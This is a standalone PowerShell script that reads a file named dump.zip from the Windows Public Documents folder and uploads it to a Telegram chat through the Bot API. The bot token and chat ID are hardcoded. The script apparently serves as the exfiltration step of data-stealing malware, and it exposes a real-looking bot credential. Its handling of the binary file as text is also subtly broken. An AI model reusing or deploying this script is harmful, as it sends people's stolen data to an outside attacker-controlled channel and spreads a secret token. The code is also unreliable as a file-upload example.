# Define the bot token, chat ID, and file path
$botToken = "7114983794:AAGyo81srw1mdAfxNSHtggO7PvEk-au038I"
$chatID = "7925642901"
$filePath = "C:\Users\Public\Documents\dump.zip"

# Verify the file exists
if (-Not (Test-Path $filePath)) {
    Write-Output "File does not exist: $filePath"
    exit
}

# Prepare the API URL
$apiUrl = "https://api.telegram.org/bot$botToken/sendDocument"

# Create a boundary for the multipart form data
$boundary = [System.Guid]::NewGuid().ToString()

# Create the multipart form data
$bodyLines = @(
    "--$boundary",
    "Content-Disposition: form-data; name=`"chat_id`"",
    "",
    $chatID,
    "--$boundary",
    "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $filePath -Leaf)`"",
    "Content-Type: application/octet-stream",
    "",
    [System.IO.File]::ReadAllText($filePath),
    "--$boundary--"
)

# Join the body lines into a single string
$body = $bodyLines -join "`r`n"

# Create the HTTP request
$request = [System.Net.HttpWebRequest]::Create($apiUrl)
$request.Method = "POST"
$request.ContentType = "multipart/form-data; boundary=$boundary"
$request.ContentLength = $body.Length

# Write the body to the request stream
try {
    $requestStream = $request.GetRequestStream()
    $writer = New-Object System.IO.StreamWriter($requestStream)
    $writer.Write($body)
    $writer.Close()

    # Get the response
    $response = $request.GetResponse()
    $responseStream = $response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($responseStream)
    $responseText = $reader.ReadToEnd()
    $reader.Close()

    # Output the response
    Write-Output "Upload successful! Response: $responseText"
} catch {
    Write-Output "Upload failed. Error: $_"
}
